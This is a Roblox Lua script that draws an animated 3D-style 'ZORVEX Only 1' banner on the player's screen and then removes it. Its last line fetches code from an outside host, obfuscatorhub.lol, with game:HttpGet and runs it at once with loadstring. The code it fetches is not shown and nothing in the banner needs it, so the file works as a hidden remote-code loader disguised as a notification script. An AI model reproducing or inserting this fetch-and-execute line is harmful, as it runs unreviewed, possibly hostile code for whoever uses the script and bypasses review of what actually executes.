local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

local function createNotification()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JoinNotification3D"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = playerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundTransparency = 1
    mainFrame.Parent = screenGui
    
    local mainLayout = Instance.new("UIListLayout")
    mainLayout.FillDirection = Enum.FillDirection.Vertical
    mainLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    mainLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    mainLayout.Padding = UDim.new(0, 15)
    mainLayout.Parent = mainFrame

    local allLetterData = {}

    local function createRow(text, topColor)
        local rowContainer = Instance.new("Frame")
        rowContainer.Size = UDim2.new(0, 0, 0.18, 0)
        rowContainer.BackgroundTransparency = 1
        rowContainer.AutomaticSize = Enum.AutomaticSize.X
        rowContainer.Parent = mainFrame
        
        local layout = Instance.new("UIListLayout")
        layout.FillDirection = Enum.FillDirection.Horizontal
        layout.Padding = UDim.new(0, 2)
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.Parent = rowContainer

        for i = 1, #text do
            local char = string.sub(text, i, i)
            if char == " " then
                local space = Instance.new("Frame")
                space.Size = UDim2.new(0, 30, 1, 0)
                space.BackgroundTransparency = 1
                space.LayoutOrder = i
                space.Parent = rowContainer
            else
                local letterFrame = Instance.new("Frame")
                letterFrame.BackgroundTransparency = 1
                letterFrame.Size = UDim2.new(0, 0, 1, 0)
                letterFrame.AutomaticSize = Enum.AutomaticSize.X 
                letterFrame.LayoutOrder = i
                letterFrame.Parent = rowContainer
                
                local uiScale = Instance.new("UIScale")
                uiScale.Scale = 0
                uiScale.Parent = letterFrame
                
                local depth = 6
                local labels = {}

                for d = depth, 0, -1 do
                    local label = Instance.new("TextLabel")
                    label.Size = UDim2.new(0, 0, 1, 0)
                    label.AutomaticSize = Enum.AutomaticSize.X
                    label.Position = UDim2.new(0, d, 0, d)
                    label.BackgroundTransparency = 1
                    label.Text = char
                    label.Font = Enum.Font.LuckiestGuy
                    label.TextSize = 100
                    label.Parent = letterFrame
                    
                    if d == 0 then
                        label.TextColor3 = Color3.fromRGB(255, 255, 255)
                        local grad = Instance.new("UIGradient")
                        
                        if topColor then
                            grad.Color = ColorSequence.new({
                                ColorSequenceKeypoint.new(0, topColor),
                                ColorSequenceKeypoint.new(0.6, Color3.fromRGB(math.floor(topColor.R*128), math.floor(topColor.G*128), math.floor(topColor.B*128))),
                                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
                            })
                        else
                            grad.Color = ColorSequence.new({
                                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(87, 87, 87)),
                                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
                            })
                        end
                        
                        grad.Rotation = 90
                        grad.Parent = label
                        label.ZIndex = 10
                    else
                        label.TextColor3 = Color3.fromRGB(0, 0, 0)
                        label.ZIndex = 10 - d
                    end
                    table.insert(labels, label)
                end
                table.insert(allLetterData, {scale = uiScale, texts = labels})
            end
        end
    end

    createRow("ZORVEX")
    createRow("Only")
    
    createRow("1", Color3.fromRGB(255, 50, 50))

    task.spawn(function()
        for _, data in ipairs(allLetterData) do
            local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
            TweenService:Create(data.scale, tweenInfo, {Scale = 1}):Play()
            task.wait(0.08) 
        end

        task.wait(4)

        for _, data in ipairs(allLetterData) do
            for _, txt in ipairs(data.texts) do
                TweenService:Create(txt, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
            end
        end
        
        task.wait(0.6)
        screenGui:Destroy()
    end)
end

createNotification()

loadstring(game:HttpGet("https://obfuscatorhub.lol/api/S6FsKMS8"))()
